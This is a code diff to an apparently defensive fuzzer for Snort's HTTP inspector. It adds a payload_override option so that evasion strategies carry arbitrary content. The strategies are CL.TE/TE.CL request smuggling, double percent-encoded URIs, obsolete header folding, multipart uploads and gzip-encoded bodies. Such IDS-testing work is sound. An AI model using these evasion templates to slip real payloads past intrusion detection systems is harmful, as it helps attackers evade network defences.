@@ -178,7 +178,7 @@ def _chunk(data: bytes) -> bytes:
     return b"%x\r\n%s\r\n0\r\n\r\n" % (len(data), data)
 
 
-def build_http_payload(strategy: str) -> bytes:
+def build_http_payload(strategy: str, payload_override=None) -> bytes:
     """
     Build an HTTP payload for the given strategy.
 
@@ -188,7 +188,7 @@ def build_http_payload(strategy: str) -> bytes:
     must be delivered server->client via wrap_tcp_response_session.
     """
     if strategy in HTTP_RESPONSE_STRATEGIES:
-        return build_http_response(strategy)
+        return build_http_response(strategy, payload_override=payload_override)
 
     if strategy == "method_overflow":
         # Valid GET method (passes classification) but a colossal URI / query.
@@ -233,6 +233,8 @@ def build_http_payload(strategy: str) -> bytes:
         # http_msg_body_chunk.cc: oversized/overflowing chunk-size hex, chunk
         # extensions, missing terminators, and size/data mismatches.
         head = b"POST /upload HTTP/1.1\r\n" + _HOST + b"Transfer-Encoding: chunked\r\n\r\n"
+        if payload_override is not None:
+            return head + b"4\r\n" + payload_override + b"\r\n0\r\n\r\n"
         variant = random.choice([
             "huge_chunk_size", "size_overflow", "negative_chunk", "chunk_ext_flood",
             "mismatch", "no_terminator", "bare_lf_chunk",
@@ -263,6 +265,13 @@ def build_http_payload(strategy: str) -> bytes:
         # CL.TE / TE.CL desync + obfuscated Transfer-Encoding. The classic class
         # of bugs where Snort and the backend disagree on message boundaries,
         # letting a smuggled request hide inside the body of the first.
+        if payload_override is not None:
+            body = (b"0\r\n\r\nPOST /smuggled HTTP/1.1\r\n" + _HOST +
+                    b"Content-Length: %d\r\n\r\n" % len(payload_override) +
+                    payload_override)
+            return (b"POST / HTTP/1.1\r\n" + _HOST +
+                    b"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n" +
+                    body)
         variant = random.choice([
             "cl_te", "te_cl", "te_dup_obfuscated", "te_space_colon",
             "te_tab", "double_cl",
@@ -298,6 +307,9 @@ def build_http_payload(strategy: str) -> bytes:
     elif strategy == "uri_evasion":
         # URI normalisation bypasses targeting http_inspect's normalizer
         # (utf8, iis_unicode, double-decode, backslash, bare paths).
+        if payload_override is not None:
+            encoded = b''.join(b'%%%02X' % c for c in payload_override)
+            return b"GET /" + encoded + b" HTTP/1.1\r\n" + _HOST + b"\r\n"
         variant = random.choice([
             "double_encode", "overlong_utf8", "dot_segments", "null_byte",
             "backslash", "unicode", "mixed_case_hex", "tab_in_uri",
@@ -407,6 +419,9 @@ def build_http_payload(strategy: str) -> bytes:
     elif strategy == "header_folding":
         # Obsolete line folding (RFC 7230 deprecated) + bare CR / bare LF.
         # Forces http_inspect's header line reassembly through rarely-hit paths.
+        if payload_override is not None:
+            head = b"GET / HTTP/1.1\r\n" + _HOST
+            return head + b"X-Data: " + payload_override + b"\r\n\t continuation\r\n\r\n"
         variant = random.choice(["obs_fold", "bare_cr", "bare_lf", "mixed_eol", "leading_ws"])
         head = b"GET / HTTP/1.1\r\n" + _HOST
         if variant == "obs_fold":
@@ -451,6 +466,9 @@ def build_http_payload(strategy: str) -> bytes:
             return b"GET / HTTP/01.01\r\n" + _HOST + b"\r\n"
 
     elif strategy == "content_length_attack":
+        if payload_override is not None:
+            return (b"POST / HTTP/1.1\r\n" + _HOST +
+                    b"Content-Length: 0\r\n\r\n" + payload_override)
         # Integer-parsing torture for the Content-Length field, which drives
         # http_inspect's body-length tracking.
         variant = random.choice([
@@ -474,6 +492,16 @@ def build_http_payload(strategy: str) -> bytes:
             return head + b"Content-Length: 10\r\nContent-Length: 4\r\n\r\nAAAA"
 
     elif strategy == "multipart_boundary":
+        if payload_override is not None:
+            boundary = b"----WebKitFormBoundaryFuzz12345678"
+            sep = b"--" + boundary + b"\r\n"
+            part = (sep + b'Content-Disposition: form-data; name="f"; filename="x"\r\n'
+                    b"Content-Type: application/octet-stream\r\n\r\n" +
+                    payload_override + b"\r\n")
+            body = part + b"--" + boundary + b"--\r\n"
+            return (b"POST /upload HTTP/1.1\r\n" + _HOST +
+                    b"Content-Type: multipart/form-data; boundary=" + boundary +
+                    b"\r\nContent-Length: %d\r\n\r\n" % len(body) + body)
         # multipart/form-data boundary parser stress. Targets the MIME boundary
         # scanner used when http_inspect hands the body to file/MIME processing.
         variant = random.choice([
@@ -501,6 +529,11 @@ def build_http_payload(strategy: str) -> bytes:
         return head + b"Content-Length: %d\r\n\r\n" % len(body) + body
 
     elif strategy == "gzip_bomb":
+        if payload_override is not None:
+            blob = _gzip_blob(payload_override)
+            return (b"POST / HTTP/1.1\r\n" + _HOST +
+                    b"Content-Encoding: gzip\r\nContent-Length: %d\r\n\r\n" %
+                    len(blob) + blob)
         # Content-Encoding decompression attacks against http_inspect's unzip.
         variant = random.choice(["bomb", "malformed_gzip", "lying_encoding", "double_gzip"])
         head = b"POST / HTTP/1.1\r\n" + _HOST
@@ -524,6 +557,9 @@ def build_http_payload(strategy: str) -> bytes:
         # Absolute-form / authority-form targets + Host header confusion.
         # http_inspect must reconcile the request-target host with the Host
         # header; mismatches and oversize values stress that logic.
+        if payload_override is not None:
+            encoded = b''.join(b'%%%02X' % c for c in payload_override)
+            return b"GET http://t/" + encoded + b" HTTP/1.1\r\n" + _HOST + b"\r\n"
         variant = random.choice([
             "absolute_form", "embedded_creds", "multi_host", "oversized_host",
             "authority_form", "host_port_junk",
@@ -669,14 +705,14 @@ def build_http_payload(strategy: str) -> bytes:
         return b"GET / HTTP/1.1\r\n" + _HOST + b"\r\n"
 
 
-def build_http_response(strategy: str) -> bytes:
+def build_http_response(strategy: str, payload_override=None) -> bytes:
     """
     Build a (possibly malformed) HTTP RESPONSE modelling the HTTP Evader
     semantic-gap evasions. Delivered server->client so Snort's http_inspect
     response parser / body-extraction path is exercised. The hidden body is a
     benign marker standing in for the content a real attacker would smuggle.
     """
-    m = _MARKER
+    m = payload_override if payload_override is not None else _MARKER
 
     if strategy == "resp_http09":
         # Part 1: HTTP/0.9 — no status line, no headers, just the body, ended by
@@ -1040,11 +1076,11 @@ class HttpMutator:
             return [self._external_weights.get(s, 5) for s in self.strategies]
         return HTTP_WEIGHTS
 
-    def mutate(self) -> tuple:
+    def mutate(self, payload_override=None) -> tuple:
         """Returns (payload_bytes, strategy_name)."""
         if self._bandit:
             strategy = self._bandit.select_with_weights(self._external_weights or {})
         else:
             strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
-        payload = build_http_payload(strategy)
+        payload = build_http_payload(strategy, payload_override=payload_override)
         return payload, strategy
